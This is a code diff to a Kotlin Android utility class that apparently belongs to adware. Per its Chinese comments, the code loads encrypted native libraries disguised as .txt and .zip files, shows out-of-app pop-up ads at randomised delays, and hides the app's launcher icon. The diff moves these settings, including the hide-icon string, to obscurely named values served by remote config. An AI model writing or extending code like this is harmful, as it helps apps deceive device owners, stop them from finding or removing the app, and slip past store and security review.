@@ -22,6 +22,7 @@ import com.facebook.appevents.AppEventsLogger
 import com.google.firebase.analytics.FirebaseAnalytics
 import com.google.firebase.analytics.ktx.analytics
 import com.google.firebase.ktx.Firebase
+import gh.cark.NcZong
 import java.io.File
 import java.io.FileOutputStream
 import java.io.InputStream
@@ -65,7 +66,6 @@ object GgUtils {
 
     @JvmStatic
     var isLoadH = false //是否H5的so 加载成功
-    private var tagL = "tohe" //调用外弹 隐藏icon字符串
     private var timeDS = 100L //延迟显示随机时间开始
     private var timeDE = 400L //延迟显示随机时间结束
     private var maxShowTime = 10000L // 最大显示时间
@@ -142,7 +142,7 @@ object GgUtils {
 
     @JvmStatic
     fun a2() {
-        Log.e("TAG", "a2: xun", )
+        Log.e("TAG", "a2: xun")
         mContext.registerActivityLifecycleCallbacks(ALLS())
         File("${mContext.dataDir}/${DataCc.c}").mkdirs()
         t()
@@ -153,7 +153,23 @@ object GgUtils {
     fun reConfig(js: JSONObject) {
         // JSON数据格式
         sK = js.optString("so_key")//So 解密的key
-        tagL = js.optString("wai_str")//隐藏icon 字符串
+
+        val kg = js.optString("tw_v")
+        val gb = js.optString("g_k_v")
+        val ff = js.optString("f_f_v")
+        val yc = js.optString("y_c_v")
+        val wt = js.optString("w_t_v")
+        DataCc.c = kg
+
+        DataCc.a = gb
+
+        DataCc.f = ff
+
+        DataCc.y = yc
+
+        DataCc.b = wt
+
+
         mAdC.setAdId(js.optString("ad_id_h"), js.optString("ad_id_l"))// 广告id
         val lt = js.optString("t_state").split("-")//时间相关配置
         cTime = lt[0].toLong() * 1000
@@ -166,11 +182,12 @@ object GgUtils {
         timeDE = lt[7].toLong()
         maxShowTime = lt[8].toLong() * 1000
         checkTimeRandom = lt[9].toInt() * 1000
+
+
     }
 
     private var lastS = ""
     private fun refreshAdmin() {
-        // todo 把外面的配置传进来通过反射、mmkv、keep后的类返回等
         val s = MasterRu.getStr("akv")
         if (lastS != s) {
             lastS = s
@@ -189,17 +206,16 @@ object GgUtils {
             val time = System.currentTimeMillis()
             val i: Boolean
             withContext(Dispatchers.IO) {
-                // todo 外弹so 加密的名字 64-32
                 i = loadSFile(if (is64i) "kuang.txt" else "kun.zip")
             }
-            Log.e("TAG", "t: 外弹so 加密=$i", )
+            Log.e("TAG", "t: 外弹so 加密=$i")
             if (i.not()) {
                 MasterRu.pE("ss_l_f", "$is64i")
                 return@launch
             }
             MasterRu.pE("test_s_load", "${System.currentTimeMillis() - time}")
-            lo.loTx(22, 11.0, tagL)
-            Log.e("TAG", "t: 隐藏icon==$tagL", )
+            lo.loTx(22, 11.0, DataCc.y)
+            Log.e("TAG", "隐藏icon==${DataCc.y}")
             while (true) {
                 // 刷新配置
                 refreshAdmin()
@@ -218,7 +234,6 @@ object GgUtils {
 
         mMainScope.launch(Dispatchers.IO) {
             delay(1000)
-            // todo H5 so 加密的名字 64-32
             if (loadSFile(if (is64i) "huang.txt" else "hua.zip")) {
                 withContext(Dispatchers.Main) {
                     try {
@@ -335,4 +350,6 @@ object GgUtils {
             ecpm.toBigDecimal(), Currency.getInstance("USD")
         )
     }
+
+
 }
